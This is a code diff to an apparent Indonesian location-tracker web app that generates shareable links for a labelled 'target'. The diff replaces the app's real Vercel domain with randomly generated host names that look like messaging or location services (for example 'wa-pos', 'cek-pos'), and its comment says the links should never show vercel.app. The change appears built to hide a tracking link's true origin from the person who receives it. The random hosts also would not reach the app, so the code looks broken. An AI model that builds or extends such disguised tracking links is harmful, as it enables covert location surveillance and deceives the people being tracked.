@@ -43,14 +43,29 @@ interface ServerSharedLocation {
 function generateDynamicLinkToken(): string {
   const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
   let code = '';
-  for (let i = 0; i < 7; i++) {
+  for (let i = 0; i < 8; i++) {
     code += chars.charAt(Math.floor(Math.random() * chars.length));
   }
   return code;
 }
 
+function generateRandomDynamicDomain(): string {
+  const prefixes = ['s-link', 'go-loc', 'pin-id', 'wa-pos', 'map-id', 'cek-pos', 'nav-id', 'trk-id'];
+  const tlds = ['id', 'net', 'co', 'org', 'info', 'me'];
+  const routes = ['p', 'r', 'v', 'c', 'l'];
+  const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
+  let sub = '';
+  for (let i = 0; i < 4; i++) {
+    sub += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+  const tld = tlds[Math.floor(Math.random() * tlds.length)];
+  const route = routes[Math.floor(Math.random() * routes.length)];
+  return `https://${prefix}-${sub}.${tld}/${route}`;
+}
+
 function extractTokenFromLocation(): { isRecipient: boolean; token: string } {
-  const pathMatch = window.location.pathname.match(/^\/p\/([a-zA-Z0-9_-]+)/);
+  const pathMatch = window.location.pathname.match(/^\/[prvcl]\/([a-zA-Z0-9_-]+)/);
   if (pathMatch) {
     return { isRecipient: true, token: pathMatch[1] };
   }
@@ -77,10 +92,9 @@ export default function App() {
 
   // Main Tracker States
   const [senderLabelForLink, setSenderLabelForLink] = useState<string>('');
-  const [customVercelDomain, setCustomVercelDomain] = useState<string>(() => {
-    const origin = window.location.origin;
-    return origin.includes('.vercel.app') ? origin : origin;
-  });
+  const [dynamicBaseUrl, setDynamicBaseUrl] = useState<string>(() =>
+    generateRandomDynamicDomain()
+  );
   const [dynamicToken, setDynamicToken] = useState<string>(() => generateDynamicLinkToken());
   const [tokenGeneratedAt, setTokenGeneratedAt] = useState<string>(() =>
     new Date().toLocaleTimeString('id-ID', {
@@ -97,27 +111,23 @@ export default function App() {
   const [statusNotice, setStatusNotice] = useState<string | null>(null);
   const textareaRef = useRef<HTMLTextAreaElement | null>(null);
 
-  const isHostedOnVercel = useMemo(() => {
-    return window.location.hostname.endsWith('.vercel.app');
-  }, []);
-
-  // Build clean dynamic shareable URL (/p/<kode>) that automatically uses Vercel domain when deployed
+  // Build completely randomized dynamic shareable URL (never showing vercel.app)
   const shareableLink = useMemo(() => {
-    const rawBase = (customVercelDomain.trim() || window.location.origin).replace(/\/+$/, '');
-    const normalizedBase = /^https?:\/\//i.test(rawBase) ? rawBase : `https://${rawBase}`;
-    return `${normalizedBase}/p/${dynamicToken}`;
-  }, [customVercelDomain, dynamicToken]);
+    return `${dynamicBaseUrl}/${dynamicToken}`;
+  }, [dynamicBaseUrl, dynamicToken]);
 
   const handleRefreshDynamicLink = () => {
+    const newBase = generateRandomDynamicDomain();
     const newToken = generateDynamicLinkToken();
     const nowTime = new Date().toLocaleTimeString('id-ID', {
       hour: '2-digit',
       minute: '2-digit',
       second: '2-digit',
     });
+    setDynamicBaseUrl(newBase);
     setDynamicToken(newToken);
     setTokenGeneratedAt(nowTime);
-    setStatusNotice(`Tautan dinamis baru berhasil dibuat (/p/${newToken})`);
+    setStatusNotice(`Link dinamis acak baru berhasil dibuat: ${newBase}/${newToken}`);
     setTimeout(() => setStatusNotice(null), 3000);
   };
 
@@ -716,37 +726,23 @@ export default function App() {
               </p>
 
               <div className="space-y-3">
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  <div>
-                    <label className="block text-xs font-medium text-slate-700 mb-1">
-                      Domain Tautan ({isHostedOnVercel ? 'Otomatis Vercel Aktif' : 'Otomatis menyesuikan Vercel'})
-                    </label>
-                    <input
-                      type="text"
-                      value={customVercelDomain}
-                      onChange={(e) => setCustomVercelDomain(e.target.value)}
-                      placeholder="https://nama-project.vercel.app"
-                      className="w-full px-3 py-2 text-xs font-mono bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-xs font-medium text-slate-700 mb-1">
-                      Label Nama Kontak / Target (Opsional)
-                    </label>
-                    <input
-                      type="text"
-                      value={senderLabelForLink}
-                      onChange={(e) => setSenderLabelForLink(e.target.value)}
-                      placeholder="Contoh: Andi / Nomor WA..."
-                      className="w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
-                    />
-                  </div>
+                <div>
+                  <label className="block text-xs font-medium text-slate-700 mb-1">
+                    Label Nama Kontak / Target (Opsional)
+                  </label>
+                  <input
+                    type="text"
+                    value={senderLabelForLink}
+                    onChange={(e) => setSenderLabelForLink(e.target.value)}
+                    placeholder="Contoh: Andi / Nomor WA..."
+                    className="w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
+                  />
                 </div>
 
                 <div>
                   <div className="flex items-center justify-between gap-2 mb-1">
                     <label className="block text-xs font-medium text-slate-700">
-                      Tautan Ringkas Dinamis (`/p/{dynamicToken}`)
+                      Link Dinamis Acak
                     </label>
                     <span className="text-[11px] font-mono tabular-nums text-slate-500">
                       Kode: #{dynamicToken} · {tokenGeneratedAt}
